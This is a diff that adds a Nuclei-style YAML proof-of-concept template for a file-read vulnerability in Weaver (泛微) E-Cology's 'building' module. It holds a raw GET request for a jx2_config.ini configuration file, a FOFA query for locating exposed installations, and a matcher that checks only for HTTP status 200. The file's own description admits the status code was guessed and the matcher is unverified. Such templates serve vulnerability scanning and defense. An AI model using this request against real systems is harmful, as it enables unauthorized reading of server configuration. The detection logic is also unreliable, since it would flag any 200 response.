@@ -1,0 +1,21 @@
+id: poc-bgzry989xvq8t1pf
+info:
+  name: 泛微E-Cology-building-存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bgzry989xvq8t1pf
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bgzry989xvq8t1pf
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
